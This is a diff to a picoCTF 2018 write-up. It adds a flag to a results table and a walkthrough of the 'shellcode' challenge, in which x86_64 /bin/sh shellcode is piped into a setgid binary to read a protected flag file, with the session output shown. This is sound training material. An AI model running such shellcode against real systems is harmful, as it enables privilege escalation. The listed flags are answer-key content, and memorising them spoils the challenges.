@@ -55,7 +55,7 @@ buffer overflow 1            Binary Exploit   200     picoCTF{addr3ss3s_ar3_3asy
 hertz 2                      Cryptography     200     picoCTF{substitution_ciphers_are_too_easy_sgsgtnpibo}
 leak-me                      Binary Exploit   200     picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
 now you don't                Forensics        200     picoCTF{n0w_y0u_533_m3}
-shellcode                    Binary Exploit   200
+shellcode                    Binary Exploit   200     picoCTF{shellc0de_w00h00_9ee0edd0}
 what base is this?           General Skills   200     picoCTF{delusions_about_finding_values_602fd280}
 you can't see me             General Skills   200     picoCTF{j0hn_c3na_paparapaaaaaaa_paparapaaaaaa_22f627d9}
 Buttons                      Web              250     picoCTF{button_button_whose_got_the_button_ed306c10}
@@ -1917,11 +1917,73 @@ int main(int argc, char **argv){
 }
 ```
 
+This code executes whatever machine instructions we give it.
+
+We connect to the
+```bash
+$ cd /problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed
+$ ll
+ll
+total 776
+drwxr-xr-x   2 root       root          4096 Sep 28 08:11 ./
+drwxr-x--x 576 root       root         53248 Sep 30 03:45 ../
+-r--r-----   1 hacksports shellcode_0     34 Sep 28 08:11 flag.txt
+-rwxr-sr-x   1 hacksports shellcode_0 725408 Sep 28 08:11 vuln*
+-rw-rw-r--   1 hacksports hacksports     562 Sep 28 08:11 vuln.c
+```
+
+So we want to read the file `flag.txt` but do not have the right permissions.
+Because the executabla `vuln` has the sgid bit set, we need to get it to
+read the contents for us.
+
+Since it execute any assembly code we give it, we can make it spawn us a
+shell, so that we can read the flag. There are many online collections of
+such shellcode. We find a shellcode on [Shellstorm](http://shell-storm.org/shellcode/).
+
+We first need to find the architecture of the remote machine
+
+```
+$ uname -a
+Linux pico-2018-shell-1 4.4.0-1067-aws #77-Ubuntu SMP Mon Aug 27 13:22:03 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+Okay, it's `Linux x86_64`. We find a shellcode on shellstorm in that category, we use
+[this one](http://shell-storm.org/shellcode/files/shellcode-690.php) but any executing
+a call to `/bin/sh` will do.
+
+
+We write the shellcode to a file and then use the following syntax to execute it:
+
+```
+$ cat ~/shellcode.txt - | ./vuln
+```
+
+to keep the shell waiting for stdin or else it will close immediately.
+
+Here we go:
+
+```bash
+$ python -c "print('\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xf
+e\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81')" > ~
+/shellcode.txt
+
+$ cat ~/shellcode.txt - | ./vuln
+Enter a string!
+1V_ȈF22i0tii0cjo΁
+Thanks! Executing now...
+
+ls
+flag.txt  vuln  vuln.c
+cat flag.txt
+picoCTF{shellc0de_w00h00_9ee0edd0}
+```
+
+
 **Solution**
 
 **Flag**
 ```
-
+picoCTF{shellc0de_w00h00_9ee0edd0}
 ```
 
 
